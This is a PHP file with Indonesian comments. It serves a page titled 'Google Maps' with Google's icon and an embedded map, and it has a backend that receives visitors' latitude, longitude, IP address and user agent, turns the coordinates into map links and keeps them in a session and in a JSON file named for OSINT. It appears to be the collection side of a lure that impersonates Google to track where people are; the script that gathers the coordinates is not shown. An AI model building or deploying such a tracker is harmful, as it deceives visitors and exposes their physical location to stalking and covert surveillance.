<?php
// Aktifkan error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Header CORS untuk mengizinkan semua origin
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Tangani preflight request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

session_start();

// Inisialisasi array data dengan pengecekan
if (!isset($_SESSION['visitor_data']) || !is_array($_SESSION['visitor_data'])) {
    $_SESSION['visitor_data'] = [];
}

// Fungsi untuk logging
function writeLog($message, $data = null) {
    $logFile = __DIR__ . '/osint_debug.log';
    $timestamp = date('Y-m-d H:i:s');
    $logMessage = "[$timestamp] $message";
    if ($data) {
        $logMessage .= " - " . json_encode($data, JSON_PRETTY_PRINT);
    }
    file_put_contents($logFile, $logMessage . PHP_EOL, FILE_APPEND);
}

writeLog("Index.php accessed from " . $_SERVER['REMOTE_ADDR']);

// Menyimpan data tracking
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    writeLog("Raw POST data", $input);
    
    if (isset($_POST['visitor_data'])) {
        $visitorData = json_decode($_POST['visitor_data'], true);
        writeLog("Decoded visitor data", $visitorData);
        
        if ($visitorData && is_array($visitorData)) {
            // Tambahkan timestamp server
            $visitorData['server_timestamp'] = date('Y-m-d H:i:s');
            $visitorData['server_ip'] = $_SERVER['REMOTE_ADDR'];
            $visitorData['server_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            
            // Validasi koordinat
            if (isset($visitorData['latitude']) && isset($visitorData['longitude'])) {
                if (abs($visitorData['latitude']) > 0.1 && abs($visitorData['longitude']) > 0.1) {
                    $visitorData['valid_coordinates'] = true;
                    $visitorData['google_maps_link'] = "https://www.google.com/maps?q={$visitorData['latitude']},{$visitorData['longitude']}";
                } else {
                    $visitorData['valid_coordinates'] = false;
                }
            }
            
            // Simpan ke session (batasi 200 data terakhir)
            array_unshift($_SESSION['visitor_data'], $visitorData);
            $_SESSION['visitor_data'] = array_slice($_SESSION['visitor_data'], 0, 200);
            
            // Simpan juga ke file sebagai backup jika session bermasalah
            $backupFile = __DIR__ . '/osint_backup.json';
            $backupData = [];
            if (file_exists($backupFile)) {
                $backupContent = file_get_contents($backupFile);
                $backupData = json_decode($backupContent, true) ?: [];
            }
            array_unshift($backupData, $visitorData);
            $backupData = array_slice($backupData, 0, 200);
            file_put_contents($backupFile, json_encode($backupData, JSON_PRETTY_PRINT));
            
            writeLog("Data saved successfully", $visitorData);
            
            echo json_encode([
                'status' => 'success',
                'message' => 'Data tracking tersimpan',
                'data' => $visitorData,
                'session_id' => session_id(),
                'server_time' => date('Y-m-d H:i:s')
            ]);
            exit;
        } else {
            writeLog("Invalid visitor data format", $visitorData);
            echo json_encode([
                'status' => 'error',
                'message' => 'Invalid data format'
            ]);
            exit;
        }
    } else {
        writeLog("No visitor_data in POST");
        echo json_encode([
            'status' => 'error',
            'message' => 'No data received'
        ]);
        exit;
    }
}

// Halaman utama
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Maps</title>
    <link rel="icon" href="https://www.google.com/images/branding/product/ico/maps15_bnuw3a_32dp.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Roboto, Arial, sans-serif;
        }
        
        body {
            background: #e9eef2;
            color: #202124;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: relative;
        }

        .map-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: auto;
        }
    </style>
</head>
<body>
    <div class="map-background">
        <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15843.34861652759!2d106.82271665!3d-6.1753924!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sid!4v1710925200000!5m2!1sen!2sid" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
    </div>
</body>
</html>